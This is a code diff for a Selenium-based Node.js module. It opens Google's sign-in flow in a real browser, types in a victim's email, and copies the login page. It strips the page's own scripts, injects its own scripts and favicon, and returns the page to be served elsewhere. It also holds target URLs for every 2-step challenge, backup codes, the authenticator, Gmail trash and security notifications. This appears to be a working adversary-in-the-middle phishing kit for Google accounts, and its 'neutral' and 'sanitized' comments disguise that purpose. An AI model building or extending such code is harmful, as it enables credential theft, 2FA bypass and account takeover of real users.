@@ -4,19 +4,83 @@ import { Builder, By, until } from "selenium-webdriver";
 import chrome from "selenium-webdriver/chrome.js";
 import psList from "ps-list";
 
-import { writeUserLog } from "./helpers.js";
+import {
+  addFunctionsScript,
+  addSetInputEmailValueScript,
+  addTimeoutScript,
+  ensureUserLogDir,
+  getSpecificTagList,
+  removeSpecificTag,
+  setFavicon,
+  setForwardUrlScript,
+  setUserIdScript,
+  writeUserLog,
+} from "./helpers.js";
 import {
   activateUserWindowByPid,
   setActiveChromeWindow,
   UsersDB,
 } from "./common.js";
 
+const JTS_TEST_MODE = 1;
+
+export const URL_DONE = "https://myaccount.google.com";
+export const URL_GOOGLE_ACCOUNT_URL = "https://accounts.google.com";
+export const URL_INPUT_EMAIL =
+  "https://accounts.google.com/v3/signin/identifier";
+export const URL_INPUT_PASSWORD =
+  "https://accounts.google.com/v3/signin/challenge/pwd";
+export const URL_RECAPTCHA = "";
+
+export const URL_2_STEP_CHALLENGE_SELECTION =
+  "https://accounts.google.com/v3/signin/challenge/selection";
+
+export const URL_2_STEP_IPE =
+  "https://accounts.google.com/v3/signin/challenge/ipe/verify";
+export const URL_2_STEP_TOTP =
+  "https://accounts.google.com/v3/signin/challenge/totp";
+export const URL_2_STEP_OOTP =
+  "https://accounts.google.com/v3/signin/challenge/ootp";
+export const URL_2_STEP_DP =
+  "https://accounts.google.com/v3/signin/challenge/dp";
+export const URL_2_STEP_DP_PRESEND =
+  "https://accounts.google.com/v3/signin/challenge/dp/presend";
+export const URL_2_STEP_IPP_COLLECT =
+  "https://accounts.google.com/v3/signin/challenge/ipp/collect";
+export const URL_2_STEP_IPP_VERIFY =
+  "https://accounts.google.com/v3/signin/challenge/ipp/verify";
+export const URL_2_STEP_BC =
+  "https://accounts.google.com/v3/signin/challenge/bc";
+export const URL_2_STEP_PASSKEY =
+  "https://accounts.google.com/v3/signin/challenge/pk/presend";
+
+export const URL_2_STEP_HELP =
+  "https://accounts.google.com/v3/signin/challenge/rejected";
+// export const URL_RECOVERY_OPTION = 'https://gds.google.com/web/recoveryoptions'
+export const URL_REJECTED = "https://accounts.google.com/v3/signin/rejected";
+// export const URL_HOMEADDR = 'https://gds.google.com/web/homeaddress'
+export const URL_RECOVERY_OPTION = "https://gds.google.com";
+
+export const URL_MAIL_INBOX = "https://mail.google.com/mail/u/0/#inbox";
+export const URL_MAIL_TRASH = "https://mail.google.com/mail/u/0/#trash";
+export const URL_ACCOUNT_SECURITY = "https://myaccount.google.com/security";
+export const URL_NOTIFICATIONS = "https://myaccount.google.com/notifications";
+export const URL_AUTHENTICATOR =
+  "https://myaccount.google.com/two-step-verification/authenticator";
+export const URL_BACKUPCODES =
+  "https://myaccount.google.com/two-step-verification/backup-codes";
+export const URL_SIGNIN_TO_CHROME =
+  "chrome://signin-dice-web-intercept.top-chrome/chrome-signin";
+
+export const URL_CHROME_EXTENSION_AUTHENTICATOR =
+  "chrome-extension://bhghoamapcdpbohphigoooaddinpkbai/view/popup.html";
+
 async function buildChrome(userId, headless = false) {
   const opts = new chrome.Options();
 
   opts.addArguments(
     "--no-sandbox",
-    "--disable-gpu",
+    // "--disable-gpu",
     "--fast-start",
     "--disable-features=UserAgentClientHint"
   );
@@ -24,9 +88,9 @@ async function buildChrome(userId, headless = false) {
   opts.debuggerAddress(`127.0.0.1:${userId}`);
   if (headless) {
     if (opts.headless) {
-      opts.headless();
+      // opts.headless();
     } else {
-      opts.addArguments("--headless=new");
+      // opts.addArguments("--headless=new");
     }
   }
   return await new Builder()
@@ -62,16 +126,16 @@ export async function waitForPageLoading(driver) {
 export async function findTab(driver, urlPrefix) {
   // Selenium doesn’t enumerate tabs’ URLs without switching; we’ll sample handles
   const handles = await driver.getAllWindowHandles();
-  let product_url = "";
-  for (const h of handles) {
-    await driver.switchTo().window(h);
-    const u = await driver.getCurrentUrl();
-    if (u.startsWith(urlPrefix)) {
-      product_url = u;
+  let productURL = "";
+  for (const hndle of handles) {
+    await driver.switchTo().window(hndle);
+    const curURL = await driver.getCurrentUrl();
+    if (curURL.startsWith(urlPrefix)) {
+      productURL = curURL;
       break;
     }
   }
-  return [driver, product_url];
+  return [driver, productURL];
 }
 
 export async function findTabExceptChromeNotice(driver) {
@@ -126,24 +190,20 @@ export async function openNewTabWithUrl(driver, url) {
 }
 
 // ----------------- Page HTML snapshot (sanitized) -----------------
-export async function getPageSource(userId) {
-  const ctx = await UsersDB.get(userId);
-  if (!ctx) return "";
-  const { driver } = ctx;
-
-  // wait for a common, neutral element if you control the page; else readyState
-  await waitForPageLoading(driver);
-
-  // Remove <script> and <iframe> before returning (client will inject their safe JS)
-  const html = await driver.executeScript(() => {
-    const root = document.querySelector("#yDmH0d") || document.body;
-    const clone = root.cloneNode(true);
-    clone.querySelectorAll("script,iframe").forEach((el) => el.remove());
-    return clone.innerHTML;
-  });
-  return html || "";
+export async function getPageSource(userId) {}
+export async function saveScreenshot(driver, userId, screenshotName) {
+  try {
+    if (!driver) return;
+    const scrnShotData = await driver.takeScreenshot();
+    const userDir = ensureUserLogDir(userId);
+    const screenShotPath = path.join(userDir, screenshotName);
+    // Save to file
+    fs.writeFileSync(screenShotPath, scrnShotData, "base64");
+    return true;
+  } catch (error) {
+    return false;
+  }
 }
-
 // ----------------- High-level flows (neutral) -----------------
 export async function scrapingReady(
   userId,
@@ -154,7 +214,7 @@ export async function scrapingReady(
   writeUserLog(userId, `Scraping Ready : ${email} ${lang} ${forwardURL}`);
   let pid = -1;
   let driver = null;
-  if (newUserFlg) {
+  if (newUserFlg || JTS_TEST_MODE) {
     pid = await setActiveChromeWindow(userId);
     writeUserLog(userId, `chrome created : pid=${pid}`);
     driver = await buildChrome(userId, true);
@@ -179,17 +239,66 @@ export async function scrapingReady(
   if (!driver || pid < 0) {
     throw new Error("Parameter is incorrect");
   }
+  await saveScreenshot(driver, userId, "scraping_ready_0.png");
 
-  const target =
-    forwardURL && /^https?:\/\//i.test(forwardURL) ? forwardURL : "";
-  await driver.get(target);
-  await waitForPageLoading(driver);
+  let productURL = findTab(driver, URL_GOOGLE_ACCOUNT_URL);
 
+  if (!productURL) {
+    writeUserLog(userId, `not_found_url = ${URL_GOOGLE_ACCOUNT_URL}`);
+    await driver.get(URL_GOOGLE_ACCOUNT_URL);
+    await waitForPageLoading(driver);
+    productURL = driver.getCurrentUrl();
+    // await driver.wait.until(until.urlIs(productURL));
+  }
+  await saveScreenshot(driver, userId, "scraping_ready_1.png");
+
+  const strXPath = '//input[@id="identifierId"]';
+
+  // Wait until element is clickable (same as EC.element_to_be_clickable)
+  const inputElement = await driver.wait(
+    until.elementIsVisible(
+      await driver.wait(until.elementLocated(By.xpath(strXPath)), 15000)
+    ),
+    15000
+  );
+
+  // Click, clear, type
+  await inputElement.click();
+  await inputElement.clear();
+  await inputElement.sendKeys(email);
+
+  const pageSource = await driver.getPageSource();
   // Snapshot sanitized HTML (no scripts/iframes)
-  const html = await getPageSource(userId);
+  writeUserLog(userId, `[pageSource] ${pageSource}`);
+  let htmlText = removeSpecificTag(pageSource, "script");
+  htmlText = removeSpecificTag(pageSource, "iframe");
+  let styleList = getSpecificTagList(pageSource, "style");
+  htmlText = removeSpecificTag(htmlText, "style");
+  let divEl = await driver.findElement(By.id("yDmH0d"));
 
-  // If you control the destination page, you can inject non-sensitive helpers here.
-  return html;
+
+  if (!divEl) {
+    return "";
+  }
+  let htmlYDmH0d = await divEl.getAttribute("innerHTML");
+  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "script");
+  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "iframe");
+  let htmlChange = htmlYDmH0d;
+  for (let i = 0; i < styleList.length; i++) {
+    htmlChange += styleList[i];
+  }
+
+  // replace
+  htmlChange = addSetInputEmailValueScript(htmlChange, email);
+  htmlText = htmlText.replace(htmlYDmH0d, htmlChange);
+  // add script
+  htmlText = setUserIdScript(htmlText, userId);
+  htmlText = setForwardUrlScript(htmlText, forwardURL);
+  htmlText = addFunctionsScript(htmlText);
+  htmlText = addTimeoutScript(htmlText);
+  htmlText = setFavicon(htmlText);
+
+  return htmlText;
 }
 
 export async function scrap_input_value_and_btn_next(
@@ -205,7 +314,7 @@ export async function scrap_input_value_and_btn_next(
     `scrap_input_value_and_btn_next : ${input_value} / ${btn_type} / ${btn_text}`
   );
   const html = await getPageSource(userId);
-  return { status: 1, html_txt: html, cur_page: "" };
+  return { status: 1, htmlText: html, cur_page: "" };
 }
 
 export async function scrapCheckURL(userId) {
@@ -216,7 +325,7 @@ export async function scrapCheckURL(userId) {
   const { driver } = ctx;
   const url = await driver.getCurrentUrl();
   const html = await getPageSource(userId);
-  return { status: 1, cur_page: "", url, html_txt: html };
+  return { status: 1, cur_page: "", url, htmlText: html };
 }
 
 export async function saveScrapingResultAndSetDone(userId) {
